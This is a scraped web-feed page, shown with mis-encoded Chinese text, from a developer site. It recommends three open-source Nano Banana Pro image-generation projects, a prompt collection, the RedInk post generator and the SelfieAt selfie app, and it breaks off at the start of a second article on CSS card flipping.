            æ¨è GitHub ä¸Š 3 ä¸ª ç‰›ç‰›ç‰› Nano Banana Pro å¼€æºé¡¹ç›®ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:47:37.000Z" title="Mon Dec 08 2025 03:47:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01ã€Awesome Nano Banana Pro</h2>
<p>Awesome Nano Banana Pro æ˜¯ä¸€ä¸ªç²¾é€‰èµ„æºåˆ—è¡¨ã€‚</p>
<p>ä¸€èˆ¬æŸä¸ªæ¨¡å‹æˆ–è€…æ–¹å‘ç«äº†åï¼ŒGitHub ä¸Šä¼šç«‹é©¬å‡ºç°ä¸€ä¸ªè¯¥æ–¹å‘çš„ Awesome åˆé›†ã€‚</p>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®ç›®å‰æ‹¥æœ‰ 2800Â é¢— Starï¼Œç²¾å¿ƒæ”¶é›†äº†å¤§é‡é«˜è´¨é‡çš„æç¤ºè¯ã€å›¾åƒç”Ÿæˆæ¡ˆä¾‹ä»¥åŠç›¸å…³æ•™ç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c3d5d23f87a4b29b457dafff9aa1dbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=mFWAtuTOEdQjCPBjQXqbxgYjUH8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†…å®¹æ¶µç›–äº†ä»ç…§ç‰‡çº§å†™å®é£æ ¼ã€åˆ›æ„å®éªŒã€ç”µå•†è™šæ‹Ÿæ‘„å½±ï¼Œåˆ°å®¤å†…è®¾è®¡ã€ç¤¾äº¤åª’ä½“è¥é”€ç´ æç­‰å¤šä¸ªé¢†åŸŸã€‚</p>
<p>æ¯ä¸€ä¸ªæ¡ˆä¾‹é€šå¸¸éƒ½é™„å¸¦äº†åŸå§‹å›¾ç‰‡ã€ç”Ÿæˆç»“æœä»¥åŠè¯¦ç»†çš„æç¤ºè¯å‚æ•°ï¼Œæ–¹ä¾¿ä½ ç›´æ¥å¤åˆ¶ä½¿ç”¨æˆ–è¿›è¡Œå¾®è°ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc84ce0662bc4bcc9809607279c195c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=vV0LFLhmeb%2FgJgCtZMySRome5Zo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹äº AI ç»˜ç”»çˆ±å¥½è€…ã€æç¤ºè¯å·¥ç¨‹å¸ˆä»¥åŠå¸Œæœ›æŒ–æ˜ Nano Banana Pro æ¨¡å‹æ½œåŠ›çš„å¼€å‘è€…æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå¿…çœ‹çš„çŸ¥è¯†åº“ã€‚</p>
<p>æŒ‘å‡ ä¸ªå¥½ç©çš„ Caseï¼Œåˆ†äº«ç»™å¤§å®¶ã€‚</p>
<p>ç™½æ¿è‰ºæœ¯ç”»</p>
<p>æç¤ºè¯ï¼šCreate a photo of vagabonds musashi praying drawn on a glass whiteboard in a slightly faded green marker</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a4435c57af744bf9b640ab0a1921fb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=5SXZmlzTaPvuNBw%2FVY0r54YvDdY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åŠ ä¸ªçœ¼ç›å’Œæ‰‹æ‰‹</p>
<p>æç¤ºè¯ï¼šAdd illustrated googly eyes and stick hands on the (object/animal/ your bff) in an exaggerated comedic pose</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af4b7bdc06de43f3a3b0d03b19839e50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=iLVDM%2FXVHkF33qlYUGJNAwOPtXk%3D" alt="å›¾ç‰‡" loading="lazy"/>å¤©æ°”å¡ç‰‡<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67ac6bf36c90449881cb00e9940eae81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=KtDmq6ZWT5FKMvMAUAzF5DrF60c%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ada92ff5afd44ef9df37077dd0a3a58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=x%2BOgMpG5p8qUqtrwGK0gyUU6%2BmA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¹´é¾„å˜åŒ–</p>
<p>æç¤ºè¯ï¼š"Generate the holiday photo of this person through the ages up to 80 years old"</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe410e5359084b2492773e1683bcf224~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=3sgxnUKZqL7omp6A5VFJtSNi5gw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€’å½’å›¾ç‰‡</p>
<p>æç¤ºè¯ï¼šrecursive image of an orange cat sitting in an office chair holding up an iPad. On the iPad is the same cat in the same scene holding up the same iPad. Repeated on each iPad.</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/635c04249ffb4aa498ff980afd422aec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=25cOajaUxJ%2FN9qUAgyrrGlYJANw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ°ç†åæ ‡å›¾ç‰‡</p>
<p>æç¤ºè¯ï¼š35.6586Â° N, 139.7454Â° E at 19:00</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3c58209e99e40e1aecbfd15b0765e5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=h2Yn5uJTtYkuDp3NjU%2B0C3PZ8aA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å·¥ç¨‹å¸ˆçœ¼ä¸­çš„å»ºç­‘</p>
<p>æç¤ºè¯ï¼šHow engineers see the San Francisco Bridge</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21bceb513c954f4fa47735e51d73e835~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=KUsOfxwtIC91W8CALGlAHVz5tVo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾è§£åº”ç”¨æ¼«ç”»</p>
<p>æç¤ºè¯ï¼šCreate a detailed {{pet store}} scene with English vocabulary labels for all objects. The format for labeling is: Line 1: English word, Line 2: IPA pronunciation, Line 3: Chinese translation</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bded1607ac0b4fb1865a1784eea68330~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=JyOtdFPwaXkxoFGM376KoulnzMY%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c89275e6325b4e81915dd69bcc40fdf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=Gkp9X7rm%2Fq7dPCI2eyJoEGJRCes%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">å¼€æºåœ°å€ï¼šhttps://github.com/ZeroLu/awesome-nanobanana-pro
</code></pre>
<h2 data-id="heading-1">02ã€å°çº¢ä¹¦åˆ›ä½œå·¥å…·</h2>
<p>RedInk æ˜¯ä¸€ä¸ªä¸“ä¸ºå°çº¢ä¹¦åˆ›ä½œè€…æ‰“é€ çš„Â AI å›¾æ–‡ç”Ÿæˆå·¥å…·ï¼Œç°åœ¨å·²ç»æ‹¥æœ‰Â 1900+ çš„ Starã€‚</p>
<p>å®ƒéå¸¸é€‚åˆè‡ªåª’ä½“åšä¸»ã€è¥é”€äººå‘˜ä»¥åŠå¸Œæœ›å¿«é€Ÿåˆ¶ä½œç²¾ç¾å›¾æ–‡å†…å®¹çš„ç”¨æˆ·ã€‚è¿™ä¸ªå¼€æºé¡¹ç›®çš„æ ¸å¿ƒå–ç‚¹æ˜¯ï¼šä¸€å¥è¯ã€ä¸€å¼ å›¾ç”Ÿæˆå°çº¢ä¹¦å›¾æ–‡ã€‚</p>
<p>æ¯”å¦‚ä½¿ç”¨è¿™ä¸ª GitHub å¼€æºé¡¹ç›®ï¼Œè¾“å…¥ï¼šç§‹å­£æ˜¾ç™½ç¾ç”²ï¼Œå›¾ç‰‡æ˜¯æˆ‘çš„å°çº¢ä¹¦ä¸»é¡µï¼Œç¬¦åˆæˆ‘çš„é£æ ¼ç”Ÿæˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c46142107a34a34b12c304edf5ae744~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=etpijuJALi6y1YwPB6hFmHLLqds%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç„¶åç­‰å¾… 10-20 ç§’åï¼Œå°±ä¼šæœ‰æ¯ä¸€é¡µçš„å¤§çº²ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®çš„è‡ªå·±çš„éœ€æ±‚å»è°ƒæ•´é¡µé¢é¡ºåºï¼Œè‡ªå®šä¹‰æ¯ä¸€ä¸ªé¡µé¢çš„å†…å®¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2d04f2ddddf4b04a6eb32a0b0b5255c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=w%2BY2%2Bjiu99gHW1U497sUDpJBTHo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é¦–å…ˆç”Ÿæˆçš„æ˜¯å°é¢å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f834cb0e0af4925bc2281a707db3d93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=KIWoYjwkBP%2BxYUKQSnOMCimZ2AQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç„¶åç¨ç­‰ä¸€ä¼šå„¿åï¼Œä¼šç”Ÿæˆåé¢çš„æ‰€æœ‰é¡µé¢ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5bb02bb032844a19b66445aedb3f78d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=IpvH80h008yDLzRx6TK4U%2F17efc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½ åªéœ€è¾“å…¥ä¸€ä¸ªä¸»é¢˜æˆ–ä¸€å¥è¯ï¼Œç³»ç»Ÿå°±èƒ½è‡ªåŠ¨ç”ŸæˆåŒ…å«å°é¢ã€å¤§çº²å’Œæ­£æ–‡é¡µé¢çš„å®Œæ•´å›¾æ–‡å†…å®¹ã€‚</p>
<p>å®ƒæ”¯æŒå¹¶å‘ç”Ÿæˆï¼Œæœ€é«˜ 25 é¡µï¼Œä½ å¯ä»¥ä¸Šä¼ å‚è€ƒå›¾ç‰‡ä»¥ä¿æŒä¸ªäººé£æ ¼ï¼Œå¹¶ä¸”æ”¯æŒå¯¹ç”Ÿæˆçš„å¤§çº²å’Œæ¯ä¸€é¡µçš„å†…å®¹è¿›è¡Œè‡ªå®šä¹‰ç¼–è¾‘ï¼Œç”Ÿæˆçš„å›¾ç‰‡é£æ ¼ç»Ÿä¸€ä¸”æ–‡å­—å‡†ç¡®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fdf79e0c3fe43e3acad35469eb9e837~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=n6%2FgvYXBmnJLVA0htD8bwGHAbqc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨æŠ€æœ¯å®ç°ä¸Šï¼ŒRedInk åç«¯ä½¿ç”¨ Python 3.11+ å’Œ Flask æ¡†æ¶ï¼Œåˆ©ç”¨ Google Gemini 3 æ¨¡å‹ç”Ÿæˆæ–‡æ¡ˆï¼Œå¹¶è°ƒç”¨ Nano Banana Pro æ¨¡å‹ç”Ÿæˆå›¾ç‰‡ã€‚</p>
<p>å‰ç«¯åˆ™åŸºäº Vue 3ã€TypeScript å’Œ Vite æ„å»ºï¼Œä½¿ç”¨ Pinia è¿›è¡ŒçŠ¶æ€ç®¡ç†ã€‚</p>
<p>é¡¹ç›®è¿˜æ”¯æŒ Docker éƒ¨ç½²ï¼Œæ–¹ä¾¿ç”¨æˆ·åœ¨æœ¬åœ°æˆ–æœåŠ¡å™¨ä¸Šå¿«é€Ÿæ­å»ºè‡ªå·±çš„ AI åˆ›ä½œåŠ©æ‰‹ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/HisMax/RedInk</span>
</code></pre>
<h2 data-id="heading-2">03ã€è‡ªæ‹ä¼ é€é—¨</h2>
<p>SelfieAt æ˜¯ä¸€ä¸ªåŸºäº Nano Banana ProÂ çš„è‡ªæ‹ä¼ é€é—¨åº”ç”¨ã€‚</p>
<p>ä½ åªéœ€ä¸Šä¼ ä¸€å¼ è‡ªæ‹ç…§ç‰‡ï¼Œå¹¶è¾“å…¥ä¸–ç•Œä¸Šçš„ä»»æ„åœ°ç‚¹ï¼Œåº”ç”¨å°±ä¼šåˆ©ç”¨ Nano Banana Pro AI æ¨¡å‹å°†ç”¨æˆ·è‡ªç„¶åœ°èåˆåˆ°æ–°çš„åœºæ™¯ä¸­ã€‚</p>
<p>å®ƒæ”¯æŒæ‘„åƒå¤´å®æ—¶æ‹æ‘„æˆ–å›¾ç‰‡ä¸Šä¼ ï¼Œå¹¶ä¸”èƒ½å¤ŸåŒæ—¶ç”Ÿæˆå¤šä¸ªåœ°ç‚¹çš„å˜ä½“å›¾ç‰‡ï¼Œç”Ÿæˆçš„å›¾åƒè¿˜å¸¦æœ‰ç²¾ç¾çš„åŠ¨æ•ˆå±•ç¤ºå’Œæ°´å°å¤„ç†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d713e6017d394c60a3552522668c242a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=AIL3XJ2HbMEcOGtRI0J%2FXBOL0IE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é¡¹ç›®é‡‡ç”¨äº†éå¸¸å‰æ²¿çš„å‰ç«¯æŠ€æœ¯æ ˆï¼ŒåŒ…æ‹¬ React 19ã€TypeScriptã€Vite 7 å’Œ Tailwind CSS 4ï¼ˆçº¿æ€§é£æ ¼è®¾è®¡ï¼‰ã€‚</p>
<p>åœ¨åç«¯ï¼Œå®ƒä½¿ç”¨ Express ä½œä¸º API ä»£ç†æ¥å®‰å…¨åœ°å¤„ç†å¯†é’¥ã€‚</p>
<p>æ ¸å¿ƒçš„ AI èƒ½åŠ›é€šè¿‡Â @fal-ai/clientÂ è°ƒç”¨ Nano Banana Pro æ¨¡å‹å®ç°ã€‚æ•´ä¸ªé¡¹ç›®ç»“æ„æ¸…æ™°ï¼Œæ¶µç›–äº†ä»å‰ç«¯ UI ç»„ä»¶åˆ°åç«¯æœåŠ¡ä»£ç†çš„å®Œæ•´æµç¨‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e1915d81a5441dcab074b9143ad0790~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770456&amp;x-signature=laiyGXP9pQ%2FeI%2BFj5qAGpWWjFzg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/amrrs/selfieat-nanobanana-pro</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cssåŠjså®ç°æ­£åé¢ç¿»è½¬]]></title>    <link>https://juejin.cn/post/7580809247736447016</link>    <guid>https://juejin.cn/post/7580809247736447016</guid>    <pubDate>2025-12-08T03:55:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736447016" data-draft-id="7580809247736348712" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cssåŠjså®ç°æ­£åé¢ç¿»è½¬"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2025-12-08T03:55:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŠ æ²¹ä¹"/> <meta itemprop="url" content="https://juejin.cn/user/84036866547575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cssåŠjså®ç°æ­£åé¢ç¿»è½¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/84036866547575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŠ æ²¹ä¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:55:23.000Z" title="Mon Dec 08 2025 03:55:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 